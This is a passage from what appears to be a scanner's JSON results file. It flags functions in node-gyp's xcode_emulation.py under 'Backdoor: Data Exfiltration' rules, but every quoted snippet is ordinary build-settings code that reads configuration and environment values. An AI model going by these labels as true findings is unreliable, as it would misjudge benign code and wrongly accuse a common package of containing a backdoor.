                    "text": "        return int(self.spec.get(\"ios_watchkit_extension\", 0)) != 0\n\n    def _IsIosWatchApp(self):\n        return int(self.spec.get(\"ios_watch_app\", 0)) != 0\n\n    def GetFrameworkVersion(self):\n        \"\"\"Returns the framework version of the current target. Only valid for\n",
                    "rendered": {
                      "text": "        return int(self.spec.get(\"ios_watchkit_extension\", 0)) != 0\n\n    def _IsIosWatchApp(self):\n        return int(self.spec.get(\"ios_watch_app\", 0)) != 0\n\n    def GetFrameworkVersion(self):\n        \"\"\"Returns the framework version of the current target. Only valid for\n",
                      "markdown": "`        return int(self.spec.get(\"ios_watchkit_extension\", 0)) != 0\n\n    def _IsIosWatchApp(self):\n        return int(self.spec.get(\"ios_watch_app\", 0)) != 0\n\n    def GetFrameworkVersion(self):\n        \"\"\"Returns the framework version of the current target. Only valid for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 28,
                  "endLine": 251,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        return int(self.spec.get(\"ios_app_extension\", 0)) != 0\n\n    def _IsIosWatchKitExtension(self):\n        return int(self.spec.get(\"ios_watchkit_extension\", 0)) != 0\n\n    def _IsIosWatchApp(self):\n        return int(self.spec.get(\"ios_watch_app\", 0)) != 0\n",
                    "rendered": {
                      "text": "        return int(self.spec.get(\"ios_app_extension\", 0)) != 0\n\n    def _IsIosWatchKitExtension(self):\n        return int(self.spec.get(\"ios_watchkit_extension\", 0)) != 0\n\n    def _IsIosWatchApp(self):\n        return int(self.spec.get(\"ios_watch_app\", 0)) != 0\n",
                      "markdown": "`        return int(self.spec.get(\"ios_app_extension\", 0)) != 0\n\n    def _IsIosWatchKitExtension(self):\n        return int(self.spec.get(\"ios_watchkit_extension\", 0)) != 0\n\n    def _IsIosWatchApp(self):\n        return int(self.spec.get(\"ios_watch_app\", 0)) != 0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 248,
                  "startColumn": 28,
                  "endLine": 248,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        return int(self.spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n\n    def _IsIosAppExtension(self):\n        return int(self.spec.get(\"ios_app_extension\", 0)) != 0\n\n    def _IsIosWatchKitExtension(self):\n        return int(self.spec.get(\"ios_watchkit_extension\", 0)) != 0\n",
                    "rendered": {
                      "text": "        return int(self.spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n\n    def _IsIosAppExtension(self):\n        return int(self.spec.get(\"ios_app_extension\", 0)) != 0\n\n    def _IsIosWatchKitExtension(self):\n        return int(self.spec.get(\"ios_watchkit_extension\", 0)) != 0\n",
                      "markdown": "`        return int(self.spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n\n    def _IsIosAppExtension(self):\n        return int(self.spec.get(\"ios_app_extension\", 0)) != 0\n\n    def _IsIosWatchKitExtension(self):\n        return int(self.spec.get(\"ios_watchkit_extension\", 0)) != 0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 245,
                  "startColumn": 28,
                  "endLine": 245,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        return int(self.spec.get(\"mac_xctest_bundle\", 0)) != 0\n\n    def _IsXCUiTest(self):\n        return int(self.spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n\n    def _IsIosAppExtension(self):\n        return int(self.spec.get(\"ios_app_extension\", 0)) != 0\n",
                    "rendered": {
                      "text": "        return int(self.spec.get(\"mac_xctest_bundle\", 0)) != 0\n\n    def _IsXCUiTest(self):\n        return int(self.spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n\n    def _IsIosAppExtension(self):\n        return int(self.spec.get(\"ios_app_extension\", 0)) != 0\n",
                      "markdown": "`        return int(self.spec.get(\"mac_xctest_bundle\", 0)) != 0\n\n    def _IsXCUiTest(self):\n        return int(self.spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n\n    def _IsIosAppExtension(self):\n        return int(self.spec.get(\"ios_app_extension\", 0)) != 0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 242,
                  "startColumn": 28,
                  "endLine": 242,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        )\n\n    def _IsXCTest(self):\n        return int(self.spec.get(\"mac_xctest_bundle\", 0)) != 0\n\n    def _IsXCUiTest(self):\n        return int(self.spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n",
                    "rendered": {
                      "text": "        )\n\n    def _IsXCTest(self):\n        return int(self.spec.get(\"mac_xctest_bundle\", 0)) != 0\n\n    def _IsXCUiTest(self):\n        return int(self.spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n",
                      "markdown": "`        )\n\n    def _IsXCTest(self):\n        return int(self.spec.get(\"mac_xctest_bundle\", 0)) != 0\n\n    def _IsXCUiTest(self):\n        return int(self.spec.get(\"mac_xcuitest_bundle\", 0)) != 0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 236,
                  "startColumn": 25,
                  "endLine": 236,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n    def _IsBundle(self):\n        return (\n            int(self.spec.get(\"mac_bundle\", 0)) != 0\n            or self._IsXCTest()\n            or self._IsXCUiTest()\n        )\n",
                    "rendered": {
                      "text": "\n    def _IsBundle(self):\n        return (\n            int(self.spec.get(\"mac_bundle\", 0)) != 0\n            or self._IsXCTest()\n            or self._IsXCUiTest()\n        )\n",
                      "markdown": "`\n    def _IsBundle(self):\n        return (\n            int(self.spec.get(\"mac_bundle\", 0)) != 0\n            or self._IsXCTest()\n            or self._IsXCUiTest()\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 228,
                  "startColumn": 48,
                  "endLine": 228,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n    def IsBinaryOutputFormat(self, configname):\n        default = \"binary\" if self.isIOS else \"xml\"\n        format = self.xcode_settings[configname].get(\"INFOPLIST_OUTPUT_FORMAT\", default)\n        return format == \"binary\"\n\n    def IsIosFramework(self):\n",
                    "rendered": {
                      "text": "\n    def IsBinaryOutputFormat(self, configname):\n        default = \"binary\" if self.isIOS else \"xml\"\n        format = self.xcode_settings[configname].get(\"INFOPLIST_OUTPUT_FORMAT\", default)\n        return format == \"binary\"\n\n    def IsIosFramework(self):\n",
                      "markdown": "`\n    def IsBinaryOutputFormat(self, configname):\n        default = \"binary\" if self.isIOS else \"xml\"\n        format = self.xcode_settings[configname].get(\"INFOPLIST_OUTPUT_FORMAT\", default)\n        return format == \"binary\"\n\n    def IsIosFramework(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 214,
                  "startColumn": 31,
                  "endLine": 214,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        return self.xcode_settings[self.configname]\n\n    def _Test(self, test_key, cond_key, default):\n        return self._Settings().get(test_key, default) == cond_key\n\n    def _Appendf(self, lst, test_key, format_str, default=None):\n        if test_key in self._Settings():\n",
                    "rendered": {
                      "text": "        return self.xcode_settings[self.configname]\n\n    def _Test(self, test_key, cond_key, default):\n        return self._Settings().get(test_key, default) == cond_key\n\n    def _Appendf(self, lst, test_key, format_str, default=None):\n        if test_key in self._Settings():\n",
                      "markdown": "`        return self.xcode_settings[self.configname]\n\n    def _Test(self, test_key, cond_key, default):\n        return self._Settings().get(test_key, default) == cond_key\n\n    def _Appendf(self, lst, test_key, format_str, default=None):\n        if test_key in self._Settings():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 181,
                  "startColumn": 46,
                  "endLine": 181,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        for configname, config in configs.items():\n            self.xcode_settings[configname] = config.get(\"xcode_settings\", {})\n            self._ConvertConditionalKeys(configname)\n            if self.xcode_settings[configname].get(\"IPHONEOS_DEPLOYMENT_TARGET\", None):\n                self.isIOS = True\n\n        # This is only non-None temporarily during the execution of some methods.\n",
                    "rendered": {
                      "text": "        for configname, config in configs.items():\n            self.xcode_settings[configname] = config.get(\"xcode_settings\", {})\n            self._ConvertConditionalKeys(configname)\n            if self.xcode_settings[configname].get(\"IPHONEOS_DEPLOYMENT_TARGET\", None):\n                self.isIOS = True\n\n        # This is only non-None temporarily during the execution of some methods.\n",
                      "markdown": "`        for configname, config in configs.items():\n            self.xcode_settings[configname] = config.get(\"xcode_settings\", {})\n            self._ConvertConditionalKeys(configname)\n            if self.xcode_settings[configname].get(\"IPHONEOS_DEPLOYMENT_TARGET\", None):\n                self.isIOS = True\n\n        # This is only non-None temporarily during the execution of some methods.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 179,
                  "startColumn": 52,
                  "endLine": 179,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        self.xcode_settings = {}\n        configs = spec[\"configurations\"]\n        for configname, config in configs.items():\n            self.xcode_settings[configname] = config.get(\"xcode_settings\", {})\n            self._ConvertConditionalKeys(configname)\n            if self.xcode_settings[configname].get(\"IPHONEOS_DEPLOYMENT_TARGET\", None):\n                self.isIOS = True\n",
                    "rendered": {
                      "text": "        self.xcode_settings = {}\n        configs = spec[\"configurations\"]\n        for configname, config in configs.items():\n            self.xcode_settings[configname] = config.get(\"xcode_settings\", {})\n            self._ConvertConditionalKeys(configname)\n            if self.xcode_settings[configname].get(\"IPHONEOS_DEPLOYMENT_TARGET\", None):\n                self.isIOS = True\n",
                      "markdown": "`        self.xcode_settings = {}\n        configs = spec[\"configurations\"]\n        for configname, config in configs.items():\n            self.xcode_settings[configname] = config.get(\"xcode_settings\", {})\n            self._ConvertConditionalKeys(configname)\n            if self.xcode_settings[configname].get(\"IPHONEOS_DEPLOYMENT_TARGET\", None):\n                self.isIOS = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1887,
                  "startColumn": 4,
                  "endLine": 1887,
                  "endColumn": 14,
                  "snippet": {
                    "text": "def GetSortedXcodeEnv(\n    xcode_settings, built_products_dir, srcroot, configuration, additional_settings=None\n):\n    env = _GetXcodeEnv(\n        xcode_settings, built_products_dir, srcroot, configuration, additional_settings\n    )\n    return [(key, env[key]) for key in _TopologicallySortedEnvVarKeys(env)]\n",
                    "rendered": {
                      "text": "def GetSortedXcodeEnv(\n    xcode_settings, built_products_dir, srcroot, configuration, additional_settings=None\n):\n    env = _GetXcodeEnv(\n        xcode_settings, built_products_dir, srcroot, configuration, additional_settings\n    )\n    return [(key, env[key]) for key in _TopologicallySortedEnvVarKeys(env)]\n",
                      "markdown": "`def GetSortedXcodeEnv(\n    xcode_settings, built_products_dir, srcroot, configuration, additional_settings=None\n):\n    env = _GetXcodeEnv(\n        xcode_settings, built_products_dir, srcroot, configuration, additional_settings\n    )\n    return [(key, env[key]) for key in _TopologicallySortedEnvVarKeys(env)]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1875,
                  "startColumn": 47,
                  "endLine": 1875,
                  "endColumn": 62,
                  "snippet": {
                    "text": "        # Topologically sort, and then reverse, because we used an edge definition\n        # that's inverted from the expected result of this function (see comment\n        # above).\n        order = gyp.common.TopologicallySorted(env.keys(), GetEdges)\n        order.reverse()\n        return order\n    except gyp.common.CycleError as e:\n",
                    "rendered": {
                      "text": "        # Topologically sort, and then reverse, because we used an edge definition\n        # that's inverted from the expected result of this function (see comment\n        # above).\n        order = gyp.common.TopologicallySorted(env.keys(), GetEdges)\n        order.reverse()\n        return order\n    except gyp.common.CycleError as e:\n",
                      "markdown": "`        # Topologically sort, and then reverse, because we used an edge definition\n        # that's inverted from the expected result of this function (see comment\n        # above).\n        order = gyp.common.TopologicallySorted(env.keys(), GetEdges)\n        order.reverse()\n        return order\n    except gyp.common.CycleError as e:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1819,
                  "startColumn": 14,
                  "endLine": 1819,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    return additional_settings\n\n\ndef _NormalizeEnvVarReferences(str):\n    \"\"\"Takes a string containing variable references in the form ${FOO}, $(FOO),\n  or $FOO, and returns a string with all variable references in the form ${FOO}.\n  \"\"\"\n",
                    "rendered": {
                      "text": "    return additional_settings\n\n\ndef _NormalizeEnvVarReferences(str):\n    \"\"\"Takes a string containing variable references in the form ${FOO}, $(FOO),\n  or $FOO, and returns a string with all variable references in the form ${FOO}.\n  \"\"\"\n",
                      "markdown": "`    return additional_settings\n\n\ndef _NormalizeEnvVarReferences(str):\n    \"\"\"Takes a string containing variable references in the form ${FOO}, $(FOO),\n  or $FOO, and returns a string with all variable references in the form ${FOO}.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1814,
                  "startColumn": 43,
                  "endLine": 1814,
                  "endColumn": 57,
                  "snippet": {
                    "text": "    additional_settings.update(env)\n\n    for k in additional_settings:\n        additional_settings[k] = _NormalizeEnvVarReferences(additional_settings[k])\n\n    return additional_settings\n\n",
                    "rendered": {
                      "text": "    additional_settings.update(env)\n\n    for k in additional_settings:\n        additional_settings[k] = _NormalizeEnvVarReferences(additional_settings[k])\n\n    return additional_settings\n\n",
                      "markdown": "`    additional_settings.update(env)\n\n    for k in additional_settings:\n        additional_settings[k] = _NormalizeEnvVarReferences(additional_settings[k])\n\n    return additional_settings\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1796,
                  "startColumn": 39,
                  "endLine": 1796,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    if install_name_base:\n        env[\"DYLIB_INSTALL_NAME_BASE\"] = install_name_base\n    xcode_version, _ = XcodeVersion()\n    if xcode_version >= \"0500\" and not env.get(\"SDKROOT\"):\n        sdk_root = xcode_settings._SdkRoot(configuration)\n        if not sdk_root:\n            sdk_root = xcode_settings._XcodeSdkPath(\"\")\n",
                    "rendered": {
                      "text": "    if install_name_base:\n        env[\"DYLIB_INSTALL_NAME_BASE\"] = install_name_base\n    xcode_version, _ = XcodeVersion()\n    if xcode_version >= \"0500\" and not env.get(\"SDKROOT\"):\n        sdk_root = xcode_settings._SdkRoot(configuration)\n        if not sdk_root:\n            sdk_root = xcode_settings._XcodeSdkPath(\"\")\n",
                      "markdown": "`    if install_name_base:\n        env[\"DYLIB_INSTALL_NAME_BASE\"] = install_name_base\n    xcode_version, _ = XcodeVersion()\n    if xcode_version >= \"0500\" and not env.get(\"SDKROOT\"):\n        sdk_root = xcode_settings._SdkRoot(configuration)\n        if not sdk_root:\n            sdk_root = xcode_settings._XcodeSdkPath(\"\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1787,
                  "startColumn": 8,
                  "endLine": 1787,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n\n    install_name = xcode_settings.GetInstallName()\n    if install_name:\n",
                    "rendered": {
                      "text": "        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n\n    install_name = xcode_settings.GetInstallName()\n    if install_name:\n",
                      "markdown": "`        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n\n    install_name = xcode_settings.GetInstallName()\n    if install_name:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1786,
                  "startColumn": 8,
                  "endLine": 1786,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        ] = xcode_settings.GetBundleSharedSupportFolderPath()\n        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n\n    install_name = xcode_settings.GetInstallName()\n",
                    "rendered": {
                      "text": "        ] = xcode_settings.GetBundleSharedSupportFolderPath()\n        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n\n    install_name = xcode_settings.GetInstallName()\n",
                      "markdown": "`        ] = xcode_settings.GetBundleSharedSupportFolderPath()\n        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n\n    install_name = xcode_settings.GetInstallName()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1785,
                  "startColumn": 8,
                  "endLine": 1785,
                  "endColumn": 59,
                  "snippet": {
                    "text": "            \"SHARED_SUPPORT_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleSharedSupportFolderPath()\n        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n\n",
                    "rendered": {
                      "text": "            \"SHARED_SUPPORT_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleSharedSupportFolderPath()\n        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n\n",
                      "markdown": "`            \"SHARED_SUPPORT_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleSharedSupportFolderPath()\n        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1784,
                  "startColumn": 8,
                  "endLine": 1784,
                  "endColumn": 55,
                  "snippet": {
                    "text": "        env[\n            \"SHARED_SUPPORT_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleSharedSupportFolderPath()\n        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n",
                    "rendered": {
                      "text": "        env[\n            \"SHARED_SUPPORT_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleSharedSupportFolderPath()\n        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n",
                      "markdown": "`        env[\n            \"SHARED_SUPPORT_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleSharedSupportFolderPath()\n        env[\"PLUGINS_FOLDER_PATH\"] = xcode_settings.GetBundlePlugInsFolderPath()\n        env[\"XPCSERVICES_FOLDER_PATH\"] = xcode_settings.GetBundleXPCServicesFolderPath()\n        env[\"INFOPLIST_PATH\"] = xcode_settings.GetBundlePlistPath()\n        env[\"WRAPPER_NAME\"] = xcode_settings.GetWrapperName()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1777,
                  "startColumn": 8,
                  "endLine": 1777,
                  "endColumn": 58,
                  "snippet": {
